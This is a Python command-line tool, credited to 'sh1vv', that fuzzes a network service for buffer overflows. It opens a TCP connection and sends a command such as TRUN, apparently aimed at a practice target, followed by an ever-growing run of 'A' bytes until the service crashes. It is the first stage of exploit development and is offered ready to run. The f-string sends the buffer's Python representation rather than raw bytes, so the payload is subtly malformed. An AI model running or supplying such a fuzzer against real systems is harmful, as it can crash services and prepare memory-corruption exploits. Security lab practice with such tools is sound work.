#!/usr/bin/python3
import sys
import socket
from time import sleep

# ASCII Art Logo
logo = r'''
 ______          _______ _______ ______  _______ _______         _______ _______ ______  _______ 
(  ___ \|\     /(  ____ (  ____ / ___  \(  ____ (  ____ |\     // ___   / ___   / ___  \(  ____ )
| (   ) | )   ( | (    \| (    \/   \  | (    )| (    \| )   ( \/   )  \/   )  \/   \  | (    )|
| (__/ /| |   | | (__   | (__      ___) | (____)| (__   | |   | |   /   )   /   )  ___) | (____)|
|  __ ( | |   | |  __)  |  __)    (___ (|     __|  __)  | |   | |  /   /   /   /  (___ (|     __)
| (  \ \| |   | | (     | (           ) | (\ (  | (     | |   | | /   /   /   /       ) | (\ (   
| )___) | (___) | )     | )     /\___/  | ) \ \_| )     | (___) |/   (_/\/   (_//\___/  | ) \ \__
|/ \___/(_______|/      |/      \______/|/   \__|/      (_______(_______(_______\______/|/   \__/
                                Buffer Overflow Fuzzing Script tool 
                                            By sh1vv
                                                                                                 
'''

def fuzz(target_ip, target_port, buffer_size, payload):
    buffer = b'A' * buffer_size

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target_ip, target_port))
    except socket.error as err:
        print(f"Error connecting to the target: {err}")
        sys.exit()

    try:
        while True:
            payload_data = f"{payload} /.:/{buffer}".encode('utf-8')
            s.send(payload_data)
            sleep(1)
            buffer += b'A' * buffer_size
    except socket.error as err:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        print(f"Error: {err}")
    finally:
        s.close()

def print_help():
    print("Usage: python script_name.py -I <target_ip> -P <target_port> --buffersize <buffer_size> -t <payload>")
    print("Options:")
    print("  -I, --target-ip    Target IP address")
    print("  -P, --target-port  Target port number")
    print("  --buffersize       Buffer size to be used (default: 100)")
    print("  -t, --payload      Payload to be used (e.g., TRUN, default: TRUN)")
    print("  -H, --help         Show this help message and exit")

def parse_arguments():
    if len(sys.argv) < 5:
        print("Error: Insufficient arguments")
        print_help()
        sys.exit(1)

    args = {}
    for i in range(1, len(sys.argv), 2):
        key = sys.argv[i]
        value = sys.argv[i+1]
        if key.startswith('-'):
            key = key.lstrip('-')
            args[key] = value
        else:
            print(f"Error: Invalid argument format for '{key}'")
            print_help()
            sys.exit(1)

    return args

if __name__ == "__main__":
    print(logo)  # Print the ASCII art logo
    args = parse_arguments()

    if 'H' in args or 'help' in args:
        print_help()
        sys.exit()

    target_ip = args.get('I', None)
    target_port = int(args.get('P', None))
    buffer_size = int(args.get('buffersize', 100))
    payload = args.get('t', 'TRUN')

    if not target_ip or not target_port:
        print("Error: Missing required arguments.")
        print_help()
        sys.exit(1)

    fuzz(target_ip, target_port, buffer_size, payload)
